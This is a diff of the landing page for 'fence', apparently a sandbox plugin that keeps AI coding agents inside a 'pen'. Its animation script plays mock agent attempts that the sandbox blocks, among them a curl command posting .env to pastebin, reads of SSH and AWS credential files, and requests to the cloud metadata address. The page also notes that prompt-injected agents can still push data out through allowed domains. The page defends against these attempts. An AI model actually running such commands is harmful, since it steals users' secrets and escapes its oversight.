+        <p>strict, plus the package registries and GitHub, so an agent can install and clone.</p>
+        <div class="meter"><i class="on"></i><i class="on"></i><i class="on"></i><i></i><i></i></div>
+        <div class="dom"><b>registry.npmjs.org</b> · pypi.org · crates.io · proxy.golang.org · github.com · …</div>
+      </div>
+      <div>
+        <h3>open <small>any domain</small></h3>
+        <p>standard's files, any domain. Still through the proxy, so every connection is in the pen's log.</p>
+        <div class="meter"><i class="on"></i><i class="on"></i><i class="on"></i><i class="on"></i><i class="on"></i></div>
+        <div class="dom"><b>*</b> · but never <b>localhost</b> or <b>169.254.169.254</b></div>
+      </div>
+    </div>
+    <div class="code toml fade">
+      <div class="bar"><i></i><i></i><i></i><span>~/.config/herdr/plugins/config/fence/profiles/work.toml</span></div>
+<pre><span class="k">description</span> = <span class="s">"standard, plus our registry"</span>
+<span class="k">extends</span> = <span class="s">"standard"</span>
+
+[<span class="k">files</span>]
+<span class="k">write</span> = [<span class="s">"~/.cache/our-tool"</span>]
+<span class="k">hide</span>  = [<span class="s">"~/work/other-client"</span>]
+
+[<span class="k">net</span>]
+<span class="k">allow</span> = [<span class="s">"npm.internal.example.com"</span>, <span class="s">"*.internal.example.com:8443"</span>]</pre>
+    </div>
+  </div>
+</section>
+
+<!-- ============ LIMITS ============ -->
+<section class="block" id="limits">
   <div class="wrap">
     <p class="kicker">// honestly</p>
-    <h2 class="fade">One fence, <span class="dim">not a vault.</span></h2>
-    <div class="body fade" style="--d:100ms"><p>fence is defence in depth: one more thing between a confused or prompt-injected agent and the rest of your machine. Here's what it doesn't stop.</p></div>
-    <ul class="limits fade" style="--d:150ms">
-      <li><span><b>Allowed domains can carry data out.</b> The proxy sees the domain, not what's inside the TLS. With GitHub allowed, an agent can push or make a gist. <code>strict</code> allows only the model APIs.</span></li>
-      <li><span><b>The pen's folder is the agent's.</b> A <code>.env</code> in the project can be read.</span></li>
-      <li><span><b>Agent config that has to stay writable.</b> Claude Code writes <code>~/.claude.json</code>, where MCP servers live. fence can't stop a change there, so a tripwire tells you the moment one happens.</span></li>
-      <li><span><b>The keychain stays reachable on macOS.</b> Your agent keeps its login there. macOS still asks you before it hands out anything else.</span></li>
-    </ul>
+    <h2 class="rv">One fence, not a vault.</h2>
+    <div class="body fade"><p>fence is defence in depth: one more thing between a confused or prompt-injected agent and the rest of your machine. So it isn't trusted for more than it is, here's what it doesn't stop.</p></div>
+    <div class="feats limits fade">
+      <div><h3>Allowed domains can carry data out</h3><p>The proxy sees the name, not what's inside the TLS. With GitHub let through, an agent can push or make a gist. <code>strict</code> keeps the list to the model APIs.</p></div>
+      <div><h3>The pen's folder is the agent's</h3><p>A <code>.env</code> in the project can be read. Keep what the agent shouldn't see outside the pen, or hide it in the profile.</p></div>
+      <div><h3>Some agent config has to stay writable</h3><p>Claude Code writes <code>~/.claude.json</code>, where MCP servers live. fence can't stop a change there, so a tripwire tells you the moment one happens.</p></div>
+      <div><h3>The keychain stays reachable on macOS</h3><p>Your agent keeps its login there. macOS still asks you before handing out anything else, and fence stops <code>git</code> asking it for your GitHub credentials.</p></div>
+    </div>
   </div>
 </section>
 
@@ -354,8 +613,8 @@ footer .rail { position: absolute; right: -40px; bottom: 30px; width: min(520px,
 <section class="block install" id="install">
   <div class="wrap split">
     <div>
-      <h2 class="fade">Setup.</h2>
-      <ol class="steps fade" style="--d:100ms">
+      <h2 class="rv">Setup.</h2>
+      <ol class="steps fade">
         <li><div><b>Install the herdr plugin</b>Nothing to build: fence has no dependencies.
           <div class="cmd"><code>herdr plugin install zenodea/fence</code><button data-copy>copy</button></div></div></li>
         <li><div><b>Bind the pen window</b>In <code>~/.config/herdr/config.toml</code>.
@@ -363,20 +622,20 @@ footer .rail { position: absolute; right: -40px; bottom: 30px; width: min(520px,
 key = "prefix+p"
 type = "plugin_action"
 command = "fence.open"</code><button data-copy>copy</button></div></div></li>
-        <li><div><b>Make a pen</b>Press <code>prefix+p</code> in a project and hit <code>n</code> for a new pen, or <code>f</code> to fence the space you're in.</div></li>
+        <li><div><b>Make a pen</b>In a project, <code>prefix+p</code> then <code>n</code>: a new space whose every shell is fenced. Or <code>f</code> to fence the space you're in.</div></li>
       </ol>
-      <p class="reqs fade" style="--d:150ms">Needs <a href="https://herdr.dev">herdr</a> 0.9+ and Node 22.18+. On Linux, <code>bubblewrap</code>. Profiles, commands and the details are in the <a href="https://github.com/zenodea/fence#readme">README</a>.</p>
+      <p class="reqs fade">Needs <a href="https://herdr.dev">herdr</a> 0.9+ and Node 22.18+. On Linux, <code>bubblewrap</code>. Profiles, commands and the details are in the <a href="https://github.com/zenodea/fence#readme">README</a>.</p>
     </div>
-    <div class="fade" style="--d:150ms">
-      <div class="shell">
-        <div class="bar"><i></i><i></i><i></i><span>~/work/api</span></div>
-        <pre id="setupShell"></pre>
+    <div class="fade">
+      <div class="shell" id="shellBox">
+        <div class="bar"><i></i><i></i><i></i><span id="shellTitle">~/work/api</span></div>
+        <pre id="shell"></pre>
       </div>
     </div>
   </div>
 </section>
 
-<footer>
+<footer id="end">
   <div class="wrap">
     <p class="big">Good fences make <span class="hl">good agents</span>.</p>
     <div class="links">
@@ -388,152 +647,300 @@ command = "fence.open"</code><button data-copy>copy</button></div></div></li>
       <a href="https://github.com/zenodea/fence/blob/main/LICENSE">MIT license</a>
     </div>
   </div>
-  <svg class="rail" viewBox="0 0 520 120" aria-hidden="true">
-    <g fill="#6E4E2E"><rect x="20" y="14" width="16" height="106" rx="3"/><rect x="190" y="14" width="16" height="106" rx="3"/><rect x="360" y="14" width="16" height="106" rx="3"/></g>
-    <g fill="#B98A55"><rect x="0" y="34" width="520" height="13" rx="4"/><rect x="0" y="74" width="520" height="13" rx="4"/></g>
+  <svg id="peek" viewBox="0 0 840 520" aria-hidden="true">
+    <defs>
+      <radialGradient id="fwool" cx=".62" cy=".3" r=".8"><stop offset="0" stop-color="#FFFFFF"/><stop offset="1" stop-color="#D9DEE8"/></radialGradient>
+      <linearGradient id="fface" x1="0" y1="0" x2="0" y2="1"><stop offset="0" stop-color="#3A3947"/><stop offset="1" stop-color="#23222C"/></linearGradient>
+      <linearGradient id="frail" x1="0" y1="0" x2="0" y2="1"><stop offset="0" stop-color="#D2A46E"/><stop offset="1" stop-color="#9C7144"/></linearGradient>
+      <linearGradient id="fpost" x1="0" y1="0" x2="1" y2="0"><stop offset="0" stop-color="#7E5A35"/><stop offset=".5" stop-color="#A57A4B"/><stop offset="1" stop-color="#6E4E2E"/></linearGradient>
+    </defs>
+    <g transform="translate(110 -372)">
+      <g fill="url(#fwool)">
+        <circle cx="120" cy="930" r="190"/><circle cx="330" cy="1000" r="160"/><circle cx="20" cy="890" r="130"/><circle cx="210" cy="790" r="130"/><circle cx="420" cy="900" r="110"/>
+      </g>
+      <g id="head" transform="rotate(-8 330 730)">
+        <ellipse cx="225" cy="690" rx="62" ry="26" transform="rotate(20 225 690)" fill="#2B2A34"/>
+        <ellipse cx="438" cy="690" rx="62" ry="26" transform="rotate(-20 438 690)" fill="#2B2A34"/>
+        <ellipse cx="330" cy="740" rx="96" ry="122" fill="url(#fface)"/>
+        <g fill="url(#fwool)"><circle cx="282" cy="628" r="46"/><circle cx="332" cy="610" r="50"/><circle cx="382" cy="628" r="44"/></g>
+        <g class="lid"><circle cx="294" cy="712" r="21" fill="#FFFFFF"/><circle id="pl" cx="298" cy="704" r="11" fill="#14131A"/></g>
+        <g class="lid"><circle cx="368" cy="712" r="21" fill="#FFFFFF"/><circle id="pr" cx="372" cy="704" r="11" fill="#14131A"/></g>
+        <ellipse cx="331" cy="806" rx="20" ry="11" fill="#17161D"/>
+      </g>
+    </g>
+    <!-- the fence it's peeking over -->
+    <g filter="drop-shadow(0 6px 8px rgba(0,0,0,.45))">
+      <rect x="40" y="372" width="44" height="200" rx="8" fill="url(#fpost)"/>
+      <rect x="560" y="372" width="44" height="200" rx="8" fill="url(#fpost)"/>
+      <rect x="-20" y="404" width="900" height="40" rx="10" fill="url(#frail)"/>
+      <rect x="-20" y="480" width="900" height="40" rx="10" fill="url(#frail)"/>
+      <path d="M-20 416h900M-20 492h900" stroke="rgba(255,255,255,.18)" stroke-width="3"/>
+      <path d="M40 380h44M560 380h44" stroke="rgba(255,255,255,.15)" stroke-width="3"/>
+    </g>
   </svg>
 </footer>
 
 <script>
-const $ = (s) => document.querySelector(s);
+(() => {
 const reduced = matchMedia("(prefers-reduced-motion: reduce)").matches;
-const esc = (s) => s.replace(/[&<>]/g, (c) => ({ "&": "&amp;", "<": "&lt;", ">": "&gt;" }[c]));
+const $ = (s, r = document) => r.querySelector(s);
+const $$ = (s, r = document) => [...r.querySelectorAll(s)];
+const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
+const esc = (s) => s.replace(/[&<>]/g, (c) => ({ "&": "&amp;", "<": "&lt;", ">": "&gt;" })[c]);
+const BRAND = { claude: "#D97757", codex: "#E5E5E5", gemini: "#8E75B2" };
 
-addEventListener("scroll", () => $("#nav").classList.toggle("scrolled", scrollY > 20), { passive: true });
-const io = new IntersectionObserver((es) => es.forEach((e) => { if (e.isIntersecting) { e.target.classList.add("in"); io.unobserve(e.target); } }), { threshold: .15 });
-document.querySelectorAll(".fade").forEach((el) => io.observe(el));
-document.querySelectorAll("[data-copy]").forEach((b) => b.addEventListener("click", async () => {
-  try { await navigator.clipboard.writeText(b.previousElementSibling.textContent); b.textContent = "copied"; setTimeout(() => (b.textContent = "copy"), 1400); } catch {}
+/* ---------- nav + reveals ---------- */
+const nav = $("#nav");
+addEventListener("scroll", () => nav.classList.toggle("scrolled", scrollY > 20), { passive: true });
+$$(".rv").forEach((el) => {
+  let i = 0;
+  const walk = (node) => {
+    [...node.childNodes].forEach((n) => {
+      if (n.nodeType === 3) {
+        const frag = document.createDocumentFragment();
+        n.textContent.split(/(\s+)/).forEach((part) => {
+          if (!part) return;
+          if (/^\s+$/.test(part)) return frag.append(part);
+          const w = document.createElement("span");
+          w.className = "w";
+          w.innerHTML = `<span style="--i:${i++}">${esc(part)}</span>`;
+          frag.append(w);
+        });
+        n.replaceWith(frag);
+      } else if (n.nodeType === 1) walk(n);
+    });
+  };
+  walk(el);
+});
+const io = new IntersectionObserver((es) => es.forEach((e) => { if (e.isIntersecting) { e.target.classList.add("in"); io.unobserve(e.target); } }), { threshold: .2, rootMargin: "0px 0px -8% 0px" });
+$$(".rv, .fade").forEach((el) => io.observe(el));
+const whenVisible = (el, cb, threshold = .35) => {
+  const state = { visible: false };
+  new IntersectionObserver(([e]) => { state.visible = e.isIntersecting; cb && cb(state.visible); }, { threshold }).observe(el);
+  return state;
+};
+$$("[data-copy]").forEach((b) => b.addEventListener("click", async () => {
+  try { await navigator.clipboard.writeText(b.previousElementSibling.textContent); b.textContent = "copied"; } catch { b.textContent = "select it"; }
+  setTimeout(() => (b.textContent = "copy"), 1600);
 }));
 
-/* ---------- the field: a pen, its sheep, and what they try ---------- */
-const DENIED = [
-  "pastebin.com", "~/.ssh/id_ed25519", ".git/hooks/pre-commit", "herdr pane split", "~/.aws/credentials",
-  "osascript → Terminal", "169.254.169.254", "~/.zshrc", "webhook.site", "localhost:4777", "~/.config/gh/hosts.yml",
+/* ---------- the hero: what an agent tries, in herdr and in the field ---------- */
+// Each attempt plays out in the herdr pane, the headline and the toast, and a
+// sheep in the field makes for the fence at the same moment.
+const TRIES = [
+  { who: "claude", what: "~/.ssh/id_ed25519", prompt: "deploy the api to the staging box",
+    tool: "Read(~/.ssh/id_ed25519)", out: "Error: EPERM: operation not permitted", reply: "I can't read your SSH key from here, so I'll use the deploy key the CI already has.",
+    toast: "blocked reading ~/.ssh/id_ed25519", label: "~/.ssh/id_ed25519" },
+  { who: "claude", what: "pastebin.com", prompt: "share the failing config with me",
+    tool: "Bash(curl -d @.env https://pastebin.com/api)", out: "fence: pastebin.com is outside this pen's fence.", reply: "That upload was stopped by the sandbox. Here's the config inline, with the secrets left out.",
+    toast: "blocked pastebin.com", label: "pastebin.com" },
+  { who: "codex", what: ".git/hooks/pre-commit", prompt: "make sure lint runs before every commit",
+    tool: "Write(.git/hooks/pre-commit)", out: "EPERM: operation not permitted", reply: "Hooks are read-only in this pen. I've added a lint script to package.json for you to wire up.",
+    toast: "blocked writing .git/hooks/pre-commit", label: ".git/hooks/pre-commit" },
+  { who: "gemini", what: "an unfenced pane", prompt: "run the dev server next to this",
+    tool: "Bash(herdr pane split --direction right)", out: "fence: pane.split is not allowed from inside a pen", reply: "I can't open panes from inside the pen, so the server is running in the background here.",
+    toast: "blocked herdr pane.split", label: "herdr pane split" },
+  { who: "claude", what: "Terminal.app", prompt: "open a terminal in the repo for me",
+    tool: "Bash(osascript -e 'tell app \"Terminal\" to do script …')", out: "Not authorized to send Apple events to Terminal. (-1743)", reply: "The pen won't let me drive other apps. You can open one with prefix+c.",
+    toast: "blocked osascript controlling another app", label: "osascript → Terminal" },
 ];
-const ALLOWED = ["api.anthropic.com", "registry.npmjs.org", "github.com", "pypi.org", "api.openai.com"];
+const h1 = $("#h1"), h1text = $("#h1text"), pane = $("#hpane");
+const htoast = $("#htoast");
+function setHeadline(t) {
+  const html = `<span class="line"><span class="who" style="color:${BRAND[t.who]}">${t.who}</span> went for</span><span class="line"><span class="what">${esc(t.what)}</span></span><span class="line">and hit the <span class="hl">fence</span>.</span>`;
+  if (reduced) { h1text.innerHTML = html; return; }
+  h1.classList.add("leaving");
+  setTimeout(() => {
+    h1text.innerHTML = html;
+    h1.classList.remove("leaving"); h1.classList.add("entering");
+    void h1text.offsetWidth; h1.classList.remove("entering");
+  }, 350);
+}
+const paneLine = (html, cls = "ln") => { const d = document.createElement("div"); d.className = cls; d.innerHTML = html; pane.append(d); while (pane.children.length > 24) pane.firstChild.remove(); return d; };
+const SPIN = "✢✳✶✻✽✻✶✳";
+async function playTry(t, first) {
+  const color = BRAND[t.who];
+  if (!first) paneLine("", "gap");
+  paneLine(`<span class="c-m">&gt;</span> ${esc(t.prompt)}`);
+  const think = paneLine(`<span class="spin" style="color:${color}">✢</span> <span class="c-m">Thinking…</span>`);
+  for (let i = 0; i < 10; i++) { think.firstChild.textContent = SPIN[i % SPIN.length]; await sleep(reduced ? 0 : 110); }
+  think.remove();
+  paneLine(`<span style="color:${color}">⏺</span> <span class="c-b">${esc(t.tool)}</span>`);
+  await sleep(reduced ? 0 : 520);
+  paneLine(`<span class="c-d">  ⎿ </span><span class="c-rh">${esc(t.out)}</span>`);
+  field.bump(t.label);
+  setHeadline(t);
+  $("#htoastT").textContent = `🐑 ${t.toast}`;
+  htoast.classList.add("on");
+  setTimeout(() => htoast.classList.remove("on"), 2800);
+  await sleep(reduced ? 0 : 900);
+  paneLine(`<span style="color:${color}">⏺</span> ${esc(t.reply)}`);
+}
+// an earlier turn, so the pane is never empty
+paneLine(`<span class="c-m">&gt;</span> add rate limiting to the users route`);
+paneLine(`<span style="color:var(--claude)">⏺</span> <span class="c-b">Bash(npm install express-rate-limit)</span>`);
+paneLine(`<span class="c-d">  ⎿ </span><span class="c-m">added 1 package in 640ms</span>`);
+paneLine(`<span style="color:var(--claude)">⏺</span> <span class="c-b">Update(src/routes/users.ts)</span>`);
+paneLine(`<span class="c-d">  ⎿ </span><span class="c-gh">+12</span> <span class="c-rh">-1</span>`);
+paneLine(`<span style="color:var(--claude)">⏺</span> Done: 100 requests a minute per key, tests pass.`);
+let tryIdx = 0, skip = null;
+const heroVis = whenVisible($("#heroWin"), null, .2);
+async function heroLoop() {
+  for (let n = 0; ; n++) {
+    while (!heroVis.visible || document.visibilityState !== "visible") await sleep(300);
+    await playTry(TRIES[tryIdx % TRIES.length], false);
+    tryIdx++;
+    await Promise.race([sleep(4200), new Promise((r) => (skip = r))]);
+  }
+}
+
+/* ---------- the field: a pen around the herdr window ---------- */
 const field = (() => {
   const cv = $("#field"), ctx = cv.getContext("2d");
-  let W = 0, H = 0, dpr = 1, grass = null, pen = null, sheep = [], labels = [], packets = [], flashes = [];
+  let W = 0, H = 0, dpr = 1, grass = null, pen = null, hole = null, sheep = [], labels = [], packets = [], flashes = [];
   const mouse = { x: -999, y: -999, on: false };
   const rnd = (a, b) => a + Math.random() * (b - a);
   const pick = (a) => a[Math.floor(Math.random() * a.length)];
-
+  function layout() {
+    const r = cv.getBoundingClientRect(), w = $("#heroWin").getBoundingClientRect();
+    const narrow = W < 900, pad = narrow ? 38 : 84;
+    const copyRight = narrow ? 0 : $(".hero .wrap > div").getBoundingClientRect().right - r.left + 22;
+    hole = { x: w.left - r.left - 6, y: w.top - r.top - 6, w: w.width + 12, h: w.height + 12 };
+    pen = { x: Math.max(14, copyRight, hole.x - pad), y: Math.max(76, hole.y - pad), w: 0, h: 0 };
+    pen.w = Math.min(W - (narrow ? 14 : 150), hole.x + hole.w + pad) - pen.x;
+    pen.h = Math.min(H - 20, hole.y + hole.h + pad) - pen.y;
+    pen.gate = { y: hole.y + hole.h * .7, half: narrow ? 16 : 24 };
+  }
   function resize() {
     const r = cv.getBoundingClientRect();
     dpr = Math.min(devicePixelRatio || 1, 2); W = r.width; H = r.height;
     cv.width = W * dpr; cv.height = H * dpr;
-    const narrow = W < 900;
-    // narrow screens: the pen goes under the words, wherever they end
-    const below = $(".copy").getBoundingClientRect().bottom - r.top + 34;
-    pen = narrow
-      ? { x: 22, y: below, w: W - 44, h: Math.max(170, Math.min(H - below - 56, 340)) }
-      : { x: W * .55, y: H * .2, w: Math.min(W * .39, 560), h: Math.min(H * .62, 520) };
-    pen.gate = { side: "right", y: pen.y + pen.h * .62, half: 26 };
+    layout();
     grass = document.createElement("canvas"); grass.width = cv.width; grass.height = cv.height;
     const g = grass.getContext("2d"); g.scale(dpr, dpr);
     const bg = g.createRadialGradient(W * .78, H * .1, 0, W * .78, H * .1, Math.max(W, H) * .9);
     bg.addColorStop(0, "#16294A"); bg.addColorStop(.5, "#0F1D33"); bg.addColorStop(1, "#0B1422");
     g.fillStyle = bg; g.fillRect(0, 0, W, H);
-    // the pen's grass is a touch greener: grazed, cared for
-    g.fillStyle = "rgba(70,120,90,.07)"; g.fillRect(pen.x, pen.y, pen.w, pen.h);
     const n = Math.floor(W * H / 650);
     for (let i = 0; i < n; i++) {
       const x = Math.random() * W, y = Math.random() * H, l = rnd(3, 8), a = rnd(-.5, .5);
-      g.strokeStyle = `rgba(${Math.random() < .5 ? "120,160,200" : "90,140,120"},${rnd(.04, .13)})`;
+      const inPen = x > pen.x && x < pen.x + pen.w && y > pen.y && y < pen.y + pen.h;
+      g.strokeStyle = `rgba(${inPen ? "100,170,120" : Math.random() < .5 ? "120,160,200" : "90,140,120"},${rnd(.04, inPen ? .2 : .13)})`;
       g.lineWidth = rnd(.6, 1.3);
       g.beginPath(); g.moveTo(x, y); g.lineTo(x + Math.sin(a) * l, y - Math.cos(a) * l); g.stroke();
     }
-    const count = narrow ? 9 : 14;
+    const count = W < 900 ? 9 : 14;
     while (sheep.length < count) sheep.push(make());
     sheep.length = count;
-    for (const s of sheep) keepIn(s);
+    sheep.forEach(contain);
+  }
+  // somewhere in the ring between the fence and the window
+  function spot() {
+    for (let i = 0; i < 200; i++) {
+      const x = rnd(pen.x + 20, pen.x + pen.w - 20), y = rnd(pen.y + 20, pen.y + pen.h - 20);
+      if (!(x > hole.x - 16 && x < hole.x + hole.w + 16 && y > hole.y - 16 && y < hole.y + hole.h + 16)) return [x, y];
+    }
+    return [pen.x + 20, pen.y + 20];
   }
   function make() {
-    const a = rnd(0, Math.PI * 2);
-    return { x: rnd(pen.x + 40, pen.x + pen.w - 40), y: rnd(pen.y + 40, pen.y + pen.h - 40), vx: Math.cos(a) * .2, vy: Math.sin(a) * .2, h: a, wa: a, graze: rnd(0, 4), r: rnd(9, 12) * (W < 700 ? .85 : 1), seed: Math.random() * 99, target: null };
+    const [x, y] = spot(), a = rnd(0, Math.PI * 2);
+    return { x, y, vx: Math.cos(a) * .2, vy: Math.sin(a) * .2, h: a, wa: a, graze: rnd(0, 4), r: rnd(8.5, 11) * (W < 700 ? .8 : 1), seed: Math.random() * 99, target: null, label: null };
   }
-  function keepIn(s) {
-    const m = s.r * 1.2 + 6;
+  /** Inside the fence, outside the window. Returns where it touched the fence, if it did. */
+  function contain(s) {
+    const m = s.r * 1.25 + 5;
     let hit = null;
-    if (s.x < pen.x + m) { s.x = pen.x + m; s.vx = Math.abs(s.vx) * .6; hit = [pen.x, s.y]; }
-    if (s.x > pen.x + pen.w - m) { s.x = pen.x + pen.w - m; s.vx = -Math.abs(s.vx) * .6; hit = [pen.x + pen.w, s.y]; }
-    if (s.y < pen.y + m) { s.y = pen.y + m; s.vy = Math.abs(s.vy) * .6; hit = [s.x, pen.y]; }
-    if (s.y > pen.y + pen.h - m) { s.y = pen.y + pen.h - m; s.vy = -Math.abs(s.vy) * .6; hit = [s.x, pen.y + pen.h]; }
+    if (s.x < pen.x + m) { s.x = pen.x + m; s.vx = Math.abs(s.vx) * .5; hit = [pen.x, s.y]; }
+    if (s.x > pen.x + pen.w - m) { s.x = pen.x + pen.w - m; s.vx = -Math.abs(s.vx) * .5; hit = [pen.x + pen.w, s.y]; }
+    if (s.y < pen.y + m) { s.y = pen.y + m; s.vy = Math.abs(s.vy) * .5; hit = [s.x, pen.y]; }
+    if (s.y > pen.y + pen.h - m) { s.y = pen.y + pen.h - m; s.vy = -Math.abs(s.vy) * .5; hit = [s.x, pen.y + pen.h]; }
+    const l = hole.x - m, rr = hole.x + hole.w + m, t = hole.y - m, b = hole.y + hole.h + m;
+    if (s.x > l && s.x < rr && s.y > t && s.y < b) {
+      const d = [[s.x - l, "l"], [rr - s.x, "r"], [s.y - t, "t"], [b - s.y, "b"]].sort((p, q) => p[0] - q[0])[0][1];
+      if (d === "l") { s.x = l; s.vx = -Math.abs(s.vx); } else if (d === "r") { s.x = rr; s.vx = Math.abs(s.vx); }
+      else if (d === "t") { s.y = t; s.vy = -Math.abs(s.vy); } else { s.y = b; s.vy = Math.abs(s.vy); }
+    }
     return hit;
   }
   addEventListener("pointermove", (e) => { const r = cv.getBoundingClientRect(); mouse.x = e.clientX - r.left; mouse.y = e.clientY - r.top; mouse.on = mouse.y > 0 && mouse.y < H; }, { passive: true });
   cv.parentElement.addEventListener("pointerleave", () => { mouse.on = false; });
-
-  let toastTimer = null;
-  function toast(target) {
-    $("#toastTitle").textContent = `🐑 blocked ${target}`;
-    const t = $("#toast"); t.classList.add("on");
-    clearTimeout(toastTimer); toastTimer = setTimeout(() => t.classList.remove("on"), 2600);
+  // click a sheep: it runs for the nearest bit of fence, and the story moves on
+  cv.parentElement.addEventListener("click", (e) => {
+    if (e.target.closest("a, button, .hwin")) return;
+    const r = cv.getBoundingClientRect(), x = e.clientX - r.left, y = e.clientY - r.top;
+    const s = sheep.reduce((best, o) => (Math.hypot(o.x - x, o.y - y) < Math.hypot(best.x - x, best.y - y) ? o : best), sheep[0]);
+    if (Math.hypot(s.x - x, s.y - y) > 40) return;
+    send(s, pick(["~/.aws/credentials", "webhook.site", "osascript → Terminal", "~/.zshrc", "169.254.169.254", "~/.config/gh"]));
+    $("#hint").style.opacity = 0;
+    skip && skip();
+  });
+  function send(s, label) {
+    const edges = [[pen.x, s.y], [pen.x + pen.w, Math.min(s.y, pen.gate.y - 60)], [s.x, pen.y], [s.x, pen.y + pen.h]];
+    s.target = edges.reduce((b, p) => (Math.hypot(p[0] - s.x, p[1] - s.y) < Math.hypot(b[0] - s.x, b[1] - s.y) ? p : b));
+    s.label = label;
   }
-  function bump(s, at) {
-    const text = pick(DENIED);
-    labels.push({ x: at[0], y: at[1], text: `✗ ${text}`, born: performance.now(), bad: true });
+  function bump(label) {
+    const free = sheep.filter((x) => !x.target);
+    if (free.length) send(pick(free), label);
+  }
+  function hitFence(s, at) {
+    labels.push({ x: at[0], y: at[1], text: `✗ ${s.label}`, born: performance.now(), bad: true });
     flashes.push({ x: at[0], y: at[1], born: performance.now() });
-    if (Math.random() < .5) toast(text);
-    s.target = null; s.graze = -1;
+    s.target = null; s.label = null; s.graze = -1;
     const a = Math.atan2(pen.y + pen.h / 2 - s.y, pen.x + pen.w / 2 - s.x) + rnd(-.6, .6);
-    s.vx = Math.cos(a) * 1.4; s.vy = Math.sin(a) * 1.4; s.wa = a;
+    s.vx = Math.cos(a) * 1.6; s.vy = Math.sin(a) * 1.6; s.wa = a;
   }
-  // every so often a sheep makes for the fence
-  function wander() {
-    const s = pick(sheep.filter((x) => !x.target));
-    if (!s) return;
-    const side = Math.floor(Math.random() * 4);
-    const t = side === 0 ? [pen.x, rnd(pen.y + 20, pen.y + pen.h - 20)]
-      : side === 1 ? [pen.x + pen.w, rnd(pen.y + 20, pen.gate.y - 50)]
-      : side === 2 ? [rnd(pen.x + 20, pen.x + pen.w - 20), pen.y]
-      : [rnd(pen.x + 20, pen.x + pen.w - 20), pen.y + pen.h];
-    s.target = t;
-  }
-  // and every so often a request goes out through the gate
+  // now and then something it's allowed to reach goes out through the gate
   function allow() {
     const s = pick(sheep);
-    const text = pick(ALLOWED);
-    packets.push({ path: [[s.x, s.y], [pen.x + pen.w - 14, pen.gate.y], [W + 30, pen.gate.y + rnd(-40, 40)]], t: 0, text, labelled: false });
+    packets.push({ a: [s.x, s.y], b: [pen.x + pen.w, pen.gate.y], c: [W + 30, pen.gate.y + rnd(-50, 50)], t: 0, text: pick(["api.anthropic.com", "registry.npmjs.org", "github.com", "pypi.org"]), labelled: false });
   }
-
   function step(dt) {
     for (const s of sheep) {
       let ax = 0, ay = 0;
       for (const o of sheep) {
         if (o === s) continue;
         const dx = s.x - o.x, dy = s.y - o.y, d2 = dx * dx + dy * dy;
-        if (d2 < 1300 && d2 > 0) { const d = Math.sqrt(d2); ax += dx / d * (36 - d) * .012; ay += dy / d * (36 - d) * .012; }
+        if (d2 < 1200 && d2 > 0) { const d = Math.sqrt(d2); ax += dx / d * (35 - d) * .012; ay += dy / d * (35 - d) * .012; }
       }
-      let max = .45;
+      const near = 26;
+      if (!s.target) {
+        if (s.x - pen.x < near) ax += .03; if (pen.x + pen.w - s.x < near) ax -= .03;
+        if (s.y - pen.y < near) ay += .03; if (pen.y + pen.h - s.y < near) ay -= .03;
+        const inX = s.x > hole.x - near && s.x < hole.x + hole.w + near, inY = s.y > hole.y - near && s.y < hole.y + hole.h + near;
+        if (inX && inY) {
+          const dl = s.x - (hole.x - near), dr = hole.x + hole.w + near - s.x, dt2 = s.y - (hole.y - near), db = hole.y + hole.h + near - s.y;
+          const m = Math.min(dl, dr, dt2, db);
+          if (m === dl) ax -= .03; else if (m === dr) ax += .03; else if (m === dt2) ay -= .03; else ay += .03;
+        }
+      }
+      let max = .42;
       if (s.target) {
-        const dx = s.target[0] - s.x, dy = s.target[1] - s.y, d = Math.hypot(dx, dy);
-        ax += dx / d * .06; ay += dy / d * .06; max = 1.3;
+        const dx = s.target[0] - s.x, dy = s.target[1] - s.y, d = Math.hypot(dx, dy) || 1;
+        ax += dx / d * .07; ay += dy / d * .07; max = 1.5;
       } else {
         s.wa += rnd(-.25, .25);
         s.graze -= dt;
         if (s.graze < -rnd(2, 6)) s.graze = rnd(1.5, 6);
-        const want = s.graze > 0 ? .015 : .22;
+        const want = s.graze > 0 ? .015 : .2;
         ax += Math.cos(s.wa) * want * .08; ay += Math.sin(s.wa) * want * .08;
       }
       if (mouse.on) {
         const dx = s.x - mouse.x, dy = s.y - mouse.y, d = Math.hypot(dx, dy);
-        if (d < 150 && d > 0) { const f = (150 - d) / 150; ax += dx / d * f * .55; ay += dy / d * f * .55; max = 3; s.graze = -1; }
+        if (d < 140 && d > 0) { const f = (140 - d) / 140; ax += dx / d * f * .5; ay += dy / d * f * .5; max = 3; s.graze = -1; }
       }
-      s.vx = (s.vx + ax) * (s.graze > 0 && !s.target ? .9 : .97);
-      s.vy = (s.vy + ay) * (s.graze > 0 && !s.target ? .9 : .97);
+      const damp = s.graze > 0 && !s.target ? .9 : .97;
+      s.vx = (s.vx + ax) * damp; s.vy = (s.vy + ay) * damp;
       const sp = Math.hypot(s.vx, s.vy);
       if (sp > max) { s.vx *= max / sp; s.vy *= max / sp; }
       s.x += s.vx * dt * 60; s.y += s.vy * dt * 60;
-      const hit = keepIn(s);
-      if (hit && s.target) bump(s, hit);
+      const hit = contain(s);
+      if (hit && s.target) hitFence(s, hit);
       if (sp > .04) { let dh = Math.atan2(s.vy, s.vx) - s.h; dh = Math.atan2(Math.sin(dh), Math.cos(dh)); s.h += dh * Math.min(1, sp * .25 + .03); }
     }
-    for (const p of packets) p.t += dt * .55;
+    for (const p of packets) p.t += dt * .6;
     packets = packets.filter((p) => p.t < 2);
   }
-
   function drawSheep(s, t) {
     const { x, y, r, h } = s, sp = Math.min(1, Math.hypot(s.vx, s.vy));
     const bob = Math.sin(t * 9 + s.seed) * sp * 1.2;
@@ -548,7 +955,7 @@ const field = (() => {
     ctx.beginPath(); ctx.ellipse(r * .18, 0, r * .52, r * .38, 0, 0, 7); ctx.fill();
     ctx.restore();
     const wool = ctx.createRadialGradient(-r * .3, -r * .35, r * .1, 0, 0, r * 1.5);
-    wool.addColorStop(0, "#FFFFFF"); wool.addColorStop(1, "#AEB8CB");
+    wool.addColorStop(0, "#FFFFFF"); wool.addColorStop(1, s.target ? "#F3C2C2" : "#AEB8CB");
     ctx.fillStyle = wool;
     ctx.beginPath();
     for (let k = 0; k < 9; k++) {
@@ -559,60 +966,50 @@ const field = (() => {
     ctx.fill();
     ctx.restore();
   }
-
-  // the fence from above: two rails and posts, a gate on the right
+  // the fence from above: a shadow, two rails, posts, and a gate on the right
   function drawFence(now) {
     const { x, y, w, h, gate } = pen;
-    const segs = [
-      [[x, y], [x + w, y]], [[x, y + h], [x + w, y + h]], [[x, y], [x, y + h]],
